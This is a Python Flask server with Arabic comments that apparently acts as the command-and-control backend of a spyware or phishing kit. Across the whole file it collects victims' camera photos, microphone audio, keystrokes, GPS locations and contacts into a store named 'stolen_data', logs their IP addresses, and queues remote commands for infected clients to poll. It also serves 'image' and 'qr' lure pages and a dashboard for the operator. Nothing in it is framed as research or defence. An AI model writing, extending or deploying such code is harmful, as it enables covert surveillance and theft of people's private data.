from flask import Flask, render_template, request, jsonify
import os
import json
from datetime import datetime

app = Flask(__name__)

# ===== تخزين البيانات =====
stolen_data = {
    "photos": [],
    "audio": [],
    "keylogs": [],
    "locations": [],
    "contacts": [],
    "files": []
}

# ===== الصفحات =====
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/image')
def image_vector():
    return render_template('image.html')

@app.route('/qr')
def qr_vector():
    return render_template('qr.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

# ===== API البيانات =====
@app.route('/api/dashboard/data')
def dashboard_data():
    return jsonify(stolen_data)

# ===== استقبال البيانات =====
@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    t = data.get('type')
    if t in stolen_data:
        stolen_data[t].append({
            "timestamp": datetime.now().isoformat(),
            "ip": request.remote_addr,
            "content": data.get('content', '')
        })
    return jsonify({"status": "ok"})

@app.route('/api/upload/photo', methods=['POST'])
def upload_photo():
    data = request.json
    if data and 'image' in data:
        stolen_data["photos"].append({
            "timestamp": datetime.now().isoformat(),
            "ip": request.remote_addr,
            "camera": data.get('camera', 'unknown'),
            "full_image": data['image']
        })
    return jsonify({"status": "ok"})

@app.route('/api/upload/location', methods=['POST'])
def upload_location():
    data = request.json
    if data:
        stolen_data["locations"].append({
            "timestamp": datetime.now().isoformat(),
            "lat": data.get('lat'),
            "lng": data.get('lng'),
            "accuracy": data.get('accuracy')
        })
    return jsonify({"status": "ok"})

@app.route('/api/upload/contacts', methods=['POST'])
def upload_contacts():
    data = request.json
    if data:
        stolen_data["contacts"].append({
            "timestamp": datetime.now().isoformat(),
            "contacts": data.get('contacts', [])
        })
    return jsonify({"status": "ok"})

@app.route('/api/upload/keylog', methods=['POST'])
def upload_keylog():
    data = request.json
    if data:
        stolen_data["keylogs"].append({
            "timestamp": datetime.now().isoformat(),
            "keys": data.get('keys', '')
        })
    return jsonify({"status": "ok"})

@app.route('/api/upload/audio', methods=['POST'])
def upload_audio():
    data = request.json
    if data and 'audio' in data:
        stolen_data["audio"].append({
            "timestamp": datetime.now().isoformat(),
            "duration": data.get('duration', 'unknown'),
            "full_audio": data['audio']
        })
    return jsonify({"status": "ok"})

# ===== أوامر التحكم =====
pending_commands = []

@app.route('/api/command/send', methods=['POST'])
def send_command():
    data = request.json
    if not data or 'type' not in data:
        return jsonify({"status": "error"}), 400
    cmd = {
        "id": str(len(pending_commands) + 1),
        "type": data['type'],
        "params": data.get('params', {}),
        "timestamp": datetime.now().isoformat()
    }
    pending_commands.append(cmd)
    return jsonify({"status": "ok", "command_id": cmd["id"]})

@app.route('/api/command/poll')
def poll_commands():
    if pending_commands:
        cmd = pending_commands.pop(0)
        return jsonify({"command": cmd})
    return jsonify({"command": None})

@app.route('/api/command/status', methods=['POST'])
def command_status():
    return jsonify({"status": "ok"})

# ===== تشغيل =====
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    # استخدام waitress للإنتاج
    try:
        from waitress import serve
        print(f"[+] Running on 0.0.0.0:{port} with waitress")
        serve(app, host='0.0.0.0', port=port)
    except ImportError:
        app.run(host='0.0.0.0', port=port, debug=True)
else:
    # Render يستخدم هذا المسار
    pass
